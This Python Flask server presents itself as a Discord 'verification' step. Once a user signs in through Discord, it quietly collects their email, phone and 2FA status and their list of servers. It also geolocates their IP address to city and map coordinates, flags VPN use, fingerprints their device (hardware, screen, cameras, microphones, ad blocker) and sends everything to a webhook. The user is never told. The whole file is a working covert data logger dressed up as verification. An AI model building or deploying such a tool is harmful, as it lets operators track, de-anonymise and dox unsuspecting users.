"""
app.py — Flask web server.

FLOW:
  1. Bot button  ──►  Discord OAuth2 (user authorizes first, always)
  2. Discord     ──►  /callback  →  exchange code, fetch data, store by state, redirect /collect
  3. /collect        JS: adblock check → refresh rate → device → POST /save-fp → /finish
  4. /finish         Merge all data, send webhook, assign role, success page
"""

from __future__ import annotations

import asyncio
import re
import time
import urllib.parse
from datetime import datetime

import requests
from flask import Flask, Response, jsonify, redirect, render_template, request

from config import (
    APP_BASE_URL, CLIENT_ID, CLIENT_SECRET,
    OAUTH2_SCOPES, REDIRECT_URI, SECRET_KEY, WEBHOOK_URL,
)

app = Flask(__name__)
app.secret_key = SECRET_KEY

discord_bot  = None
bot_loop: asyncio.AbstractEventLoop | None = None

DISCORD_API = "https://discord.com/api/v10"

discord_store: dict[str, dict]  = {}
fp_store:      dict[str, dict]  = {}
timestamps:    dict[str, float] = {}
_TTL = 600


def _cleanup():
    now = time.time()
    for k in [k for k, t in timestamps.items() if now - t > _TTL]:
        discord_store.pop(k, None)
        fp_store.pop(k, None)
        timestamps.pop(k, None)


# ─── Helpers ──────────────────────────────────────────────────────────────────

def get_real_ip() -> str:
    for h in ("CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"):
        v = request.headers.get(h, "").split(",")[0].strip()
        if v:
            return v
    return request.remote_addr or "Unknown"


def country_flag(code: str) -> str:
    if not code or len(code) != 2:
        return ""
    return chr(ord(code[0].upper()) + 127397) + chr(ord(code[1].upper()) + 127397)


def get_ip_info(ip: str) -> dict:
    if ip in ("127.0.0.1", "::1", "localhost", "Unknown"):
        return {}
    try:
        fields = "status,country,countryCode,regionName,city,lat,lon,timezone,offset,isp,org,as,proxy,hosting"
        r = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}", timeout=5)
        d = r.json()
        return d if d.get("status") == "success" else {}
    except Exception:
        return {}


def fmt_snowflake(sid: int) -> str:
    if not sid:
        return "Unknown"
    dt = datetime.utcfromtimestamp(((sid >> 22) + 1420070400000) / 1000)
    h  = int(dt.strftime("%I"))
    return f"{dt.strftime('%B')} {dt.day}, {dt.year} at {h}:{dt.strftime('%M %p')} UTC"


def fmt_now() -> str:
    dt = datetime.utcnow()
    h  = int(dt.strftime("%I"))
    return f"{dt.strftime('%B')} {dt.day}, {dt.year} at {h}:{dt.strftime('%M %p')} UTC"


def parse_flags(flags: int) -> list[str]:
    return [name for bit, name in {
        1:       "Discord Staff",
        2:       "Partnered Server Owner",
        4:       "HypeSquad Events",
        8:       "Bug Hunter Lv.1",
        64:      "HypeSquad Bravery",
        128:     "HypeSquad Brilliance",
        256:     "HypeSquad Balance",
        512:     "Early Supporter",
        16384:   "Bug Hunter Lv.2",
        131072:  "Verified Bot Developer",
        4194304: "Active Developer",
    }.items() if flags & bit]


def nitro_label(t: int) -> str:
    return {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}.get(t, "None")


def parse_browser_and_os(ua: str, fp: dict) -> tuple[str, str]:
    """Returns (browser_name, os_name). No version numbers. Priority: Brave flag → Client Hints → UA."""
    hints    = fp.get("uaHints") or {}
    is_brave = bool(fp.get("isBrave"))

    browser = "Unknown"

    if is_brave:
        browser = "Brave"
    elif hints.get("fullVersionList"):
        noise     = {"not a brand", "not.a/brand", "chromium"}
        preferred = [
            "Microsoft Edge", "Opera", "Yandex Browser", "Samsung Internet",
            "DuckDuckGo", "Vivaldi", "UC Browser", "Chrome",
        ]
        brands = {b["brand"]: b["version"]
                  for b in hints["fullVersionList"]
                  if b["brand"].lower().strip() not in noise}
        for want in preferred:
            for brand in brands:
                if want.lower() in brand.lower():
                    browser = brand
                    break
            if browser != "Unknown":
                break
        if browser == "Unknown" and brands:
            browser = next(iter(brands))

    if browser == "Unknown":
        for pat, name in [
            (r"Edg/",              "Microsoft Edge"),
            (r"OPR/",              "Opera"),
            (r"YaBrowser/",        "Yandex Browser"),
            (r"SamsungBrowser/",   "Samsung Internet"),
            (r"DuckDuckGo/",       "DuckDuckGo"),
            (r"Vivaldi/",          "Vivaldi"),
            (r"UCBrowser/",        "UC Browser"),
            (r"Firefox/",          "Firefox"),
            (r"FxiOS/",            "Firefox"),
            (r"CriOS/",            "Chrome"),
            (r"Chrome/",           "Chrome"),
        ]:
            if re.search(pat, ua):
                browser = name
                break
        else:
            if "Safari" in ua:
                browser = "Safari"

    os_name = "Unknown"

    if hints.get("platform"):
        p = hints["platform"]
        if p == "Windows":
            os_name = fp.get("windowsVersion", "Windows 10/11")
        elif p == "macOS":
            pv = hints.get("platformVersion", "")
            os_name = f"macOS {pv}" if pv else "macOS"
        elif p == "Linux":
            os_name = "Linux"
        elif p == "Android":
            pv = hints.get("platformVersion", "")
            os_name = f"Android {pv}" if pv else "Android"
        elif p in ("iOS", "iPadOS"):
            pv = hints.get("platformVersion", "")
            os_name = f"{p} {pv}" if pv else p
        elif p == "Chrome OS":
            os_name = "ChromeOS"
        else:
            os_name = p

    if os_name == "Unknown":
        if   "Windows NT 10.0" in ua: os_name = fp.get("windowsVersion", "Windows 10/11")
        elif "Windows NT 6.3"  in ua: os_name = "Windows 8.1"
        elif "Windows NT 6.2"  in ua: os_name = "Windows 8"
        elif "Windows NT 6.1"  in ua: os_name = "Windows 7"
        elif "Windows"         in ua: os_name = "Windows"
        elif "Macintosh"       in ua:
            m = re.search(r"Mac OS X ([\d_]+)", ua)
            os_name = f"macOS {m.group(1).replace('_','.')}" if m else "macOS"
        elif "CrOS"    in ua: os_name = "ChromeOS"
        elif "Android" in ua:
            m = re.search(r"Android ([\d.]+)", ua)
            os_name = f"Android {m.group(1)}" if m else "Android"
        elif "iPhone"  in ua: os_name = "iOS (iPhone)"
        elif "iPad"    in ua: os_name = "iPadOS"
        elif "Linux"   in ua: os_name = "Linux"

    arch = hints.get("architecture", fp.get("architecture", ""))
    if arch and arch.lower() not in ("x86", "x86_64", "x64", ""):
        os_name = f"{os_name} ({arch})"

    return browser, os_name


# ─── Discord OAuth2 ───────────────────────────────────────────────────────────

def exchange_code(code: str) -> dict:
    resp = requests.post(
        f"{DISCORD_API}/oauth2/token",
        data={
            "client_id":     CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type":    "authorization_code",
            "code":          code,
            "redirect_uri":  REDIRECT_URI,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    resp.raise_for_status()
    return resp.json()


def fetch_discord_data(token: str) -> dict:
    h    = {"Authorization": f"Bearer {token}"}
    user = requests.get(f"{DISCORD_API}/users/@me",        headers=h).json()
    g    = requests.get(f"{DISCORD_API}/users/@me/guilds",  headers=h).json()
    return {
        "user":   user,
        "guilds": g if isinstance(g, list) else [],
    }


# ─── Embed builder ────────────────────────────────────────────────────────────

def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[dict]:
    user   = discord_data["user"]
    guilds = discord_data["guilds"]

    uid     = int(user.get("id", 0))
    uname   = user.get("username", "Unknown")
    discrim = user.get("discriminator", "0")
    email   = user.get("email", "Not provided")
    phone   = user.get("phone")

    av_hash = user.get("avatar", "")
    av_url  = (
        f"https://cdn.discordapp.com/avatars/{uid}/{av_hash}"
        f".{'gif' if av_hash.startswith('a_') else 'png'}?size=256"
        if av_hash else "https://cdn.discordapp.com/embed/avatars/0.png"
    )
    banner_hash = user.get("banner", "")
    banner_url  = None
    if banner_hash:
        ext = "gif" if banner_hash.startswith("a_") else "png"
        banner_url = f"https://cdn.discordapp.com/banners/{uid}/{banner_hash}.{ext}?size=512"

    email_ok = user.get("verified",    False)
    mfa      = user.get("mfa_enabled", False)
    nitro    = nitro_label(user.get("premium_type", 0))
    badges   = parse_flags(user.get("public_flags", 0))
    created  = fmt_snowflake(uid)

    is_vpn  = bool(ip_info.get("proxy") or ip_info.get("hosting"))
    flag    = country_flag(ip_info.get("countryCode", ""))
    adblock = fp.get("adBlock", False)

    color = 0xED4245 if is_vpn else (0xFEE75C if adblock else 0x57F287)

    ua_raw           = fp.get("userAgent") or "Unknown"
    browser, os_name = parse_browser_and_os(ua_raw, fp)

    def v(key, fallback="N/A"):
        val = fp.get(key)
        return str(val) if val not in (None, "", "N/A") else fallback

    # Language — JS sends base language name (e.g. "English", "Georgian")
    lang      = v("languageName")
    screen    = v("screen")
    dpr       = v("devicePixelRatio")
    cpu       = v("hardwareConcurrency")
    mem       = v("deviceMemory")
    webgl     = v("webGL")
    hz        = v("refreshRate")
    a_in      = v("audioInputs")
    a_out     = v("audioOutputs")
    v_in      = v("videoInputs")
    net_type  = v("networkType")

    now_iso = datetime.utcnow().isoformat() + "Z"

    # ── FIELD 1: Discord Account ──────────────────────────────────────────────
    discrim_str = f"#{discrim}" if discrim not in ("0", "", None) else ""
    badge_str   = "  ".join(f"`{b}`" for b in badges) if badges else "None"
    phone_str   = "✅" if phone else "❌"

    account_val = (
        f"**{uname}{discrim_str}**  `{uid}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📧  {email}  {'✅' if email_ok else '❌'}\n"
        f"📱  Phone: {phone_str}  •  🔐 2FA: {'✅' if mfa else '❌'}  •  Nitro: {nitro}\n"
        f"📅  {created}\n"
        f"🏅  {badge_str}"
    )

    # ── FIELD 2: Network & Location ───────────────────────────────────────────
    tz_offset = ip_info.get("offset", 0)
    tz_sign   = "+" if tz_offset >= 0 else ""
    tz_hours  = tz_offset // 3600 if isinstance(tz_offset, int) else "?"

    lat = ip_info.get("lat", "")
    lon = ip_info.get("lon", "")
    maps_link = f"[📍 Google Maps](https://www.google.com/maps?q={lat},{lon})" if lat and lon else ""

    vpn_line = "⚠️  **VPN / PROXY DETECTED**" if is_vpn else "✅  Clean"

    isp = ip_info.get("isp", "Unknown")
    asn = ip_info.get("as", "")
    # Show "Magticom  •  AS16010" — deduplicate if ISP name is already in AS string
    asn_short = asn.split(" ")[0] if asn else ""   # e.g. "AS16010"
    isp_line  = f"{isp}  •  {asn_short}" if asn_short else isp

    city    = ip_info.get("city", "")
    region  = ip_info.get("regionName", "")
    # Avoid "Tbilisi, Tbilisi" when city == region
    location_str = f"{city}, {region}" if city and region and city != region else city or region or "Unknown"

    network_val = (
        f"`{ip}`\n"
        f"{flag}  **{ip_info.get('country', 'Unknown')}** — {location_str}\n"
        f"{isp_line}\n"
        f"🕐  {ip_info.get('timezone', 'N/A')}  (UTC{tz_sign}{tz_hours})\n"
        + (f"{maps_link}\n" if maps_link else "")
        + f"🔒  {vpn_line}"
    )

    # ── FIELD 3: Device & Browser ─────────────────────────────────────────────
    # Screen: prefer "1920×1080" with × instead of "x"
    screen_disp = screen.replace("x", "×") if screen != "N/A" else "N/A"
    hz_disp     = hz if hz != "N/A" else "N/A"

    # "Brave on Windows 11" is more natural than two separate lines
    platform_line = f"**{browser}** on **{os_name}**"

    # Resolution + refresh on one line, CPU + RAM on one line
    display_line = f"{screen_disp} @ {dpr}×"
    if hz_disp != "N/A":
        display_line += f"  •  🔄 {hz_disp}"

    hw_line = f"⚡  **{cpu}** cores  •  **{mem}** GB RAM"

    adblock_line = f"🛡️  AdBlock: {'⚠️ **Yes**' if adblock else '✅ No'}"

    mic_cam_spk = f"🎙️  {a_in} mic  •  {v_in} cam  •  {a_out} spk"

    device_lines = [
        platform_line,
        f"🌍  {lang}" if lang != "N/A" else None,
        f"📺  {display_line}",
        hw_line,
        f"🎮  {webgl}" if webgl != "N/A" else None,
        f"📡  {net_type}" if net_type != "N/A" else None,
        adblock_line,
        mic_cam_spk,
    ]
    device_val = "\n".join(line for line in device_lines if line is not None)

    # ── Embed 1 ───────────────────────────────────────────────────────────────
    embed1: dict = {
        "title":       "🔐  New Verification",
        "description": f"<@{uid}> just verified in the server.",
        "color":       color,
        "thumbnail":   {"url": av_url},
        "fields": [
            {"name": "👤  Discord Account",    "value": account_val[:1024], "inline": False},
            {"name": "🌍  Network & Location", "value": network_val[:1024], "inline": True},
            {"name": "💻  Device & Browser",   "value": device_val[:1024],  "inline": True},
        ],
        "footer":    {"text": f"Verified at {fmt_now()}  •  User ID: {uid}"},
        "timestamp": now_iso,
    }
    if banner_url:
        embed1["image"] = {"url": banner_url}

    # ── Embed 2: Servers ──────────────────────────────────────────────────────
    guild_lines = []
    for g in guilds[:25]:
        crown = " 👑" if g.get("owner") else ""
        guild_lines.append(f"• **{g.get('name', '?')}**{crown}  `{g.get('id', '')}`")
    if len(guilds) > 25:
        guild_lines.append(f"*…and {len(guilds) - 25} more*")

    embed2 = {
        "color":  color,
        "fields": [
            {
                "name":   f"🏠  Servers ({len(guilds)})",
                "value":  ("\n".join(guild_lines) or "None visible")[:1024],
                "inline": False,
            },
        ],
        "timestamp": now_iso,
    }

    return [embed1, embed2]


def send_webhook(discord_data: dict, ip: str, ip_info: dict, fp: dict):
    if not WEBHOOK_URL:
        print("⚠️  WEBHOOK_URL not set — skipping")
        return
    try:
        embeds = build_embeds(discord_data, ip, ip_info, fp)
        r = requests.post(WEBHOOK_URL, json={"embeds": embeds}, timeout=8)
        r.raise_for_status()
        print(f"📨  Webhook sent  HTTP {r.status_code}")
    except Exception as e:
        print(f"❌  Webhook error: {e}")


# ─── Routes ───────────────────────────────────────────────────────────────────

@app.route("/ads/ad.js")
def fake_ad_script():
    """URL path (/ads/*.js) matched by all major ad blockers. Used for detection."""
    return Response(
        "window.__adLoaded=1;",
        mimetype="application/javascript",
        headers={"Cache-Control": "no-store, no-cache"},
    )


@app.route("/callback")
def callback():
    code  = request.args.get("code", "")
    state = request.args.get("state", "")
    error = request.args.get("error", "")

    if error:
        return render_template("error.html", error=request.args.get("error_description", error))
    if not code:
        return render_template("error.html", error="No authorization code received from Discord.")

    try:
        token_data   = exchange_code(code)
        access_token = token_data["access_token"]
        discord_data = fetch_discord_data(access_token)
        ip           = get_real_ip()
        ip_info      = get_ip_info(ip)

        _cleanup()
        discord_store[state] = {"discord_data": discord_data, "ip": ip, "ip_info": ip_info}
        timestamps[state]    = time.time()

        return redirect(f"{APP_BASE_URL}/collect?state={urllib.parse.quote(state)}")

    except requests.HTTPError as e:
        print(f"❌  HTTP error: {e}")
        return render_template("error.html", error="Failed to communicate with the Discord API.")
    except Exception:
        import traceback
        traceback.print_exc()
        return render_template("error.html", error="An unexpected error occurred.")


@app.route("/collect")
def collect_page():
    state = request.args.get("state", "").strip()
    if not state or state not in discord_store:
        return render_template("error.html", error="Session expired. Please click Verify Now again.")
    finish_url = f"{APP_BASE_URL}/finish?state={urllib.parse.quote(state)}"
    return render_template("collect.html", state=state, finish_url=finish_url, app_base_url=APP_BASE_URL)


@app.route("/save-fp", methods=["POST"])
def save_fp():
    data  = request.get_json(silent=True) or {}
    state = data.get("state", "").strip()
    fp    = data.get("fp", {})
    if state:
        fp_store[state]   = fp
        timestamps[state] = time.time()
        print(f"💾  FP saved …{state[-6:]}")
    return jsonify({"ok": True})


@app.route("/finish")
def finish():
    state  = request.args.get("state", "").strip()
    stored = discord_store.pop(state, None)
    fp     = fp_store.pop(state, {})
    timestamps.pop(state, None)

    if not stored:
        return render_template("error.html", error="Session expired. Please click Verify Now again.")

    discord_data = stored["discord_data"]
    ip           = stored["ip"]
    ip_info      = stored["ip_info"]
    user         = discord_data["user"]
    uid          = int(user.get("id", 0))

    if not fp.get("userAgent"):
        fp["userAgent"] = request.headers.get("User-Agent", "Unknown")

    send_webhook(discord_data, ip, ip_info, fp)

    role_given = False
    if uid and discord_bot and bot_loop:
        future = asyncio.run_coroutine_threadsafe(
            discord_bot.give_verified_role(uid), bot_loop
        )
        try:
            role_given = future.result(timeout=10)
        except Exception as e:
            print(f"⚠️  Role error: {e}")

    return render_template(
        "success.html",
        username=user.get("username", "User"),
        role_given=role_given,
    )
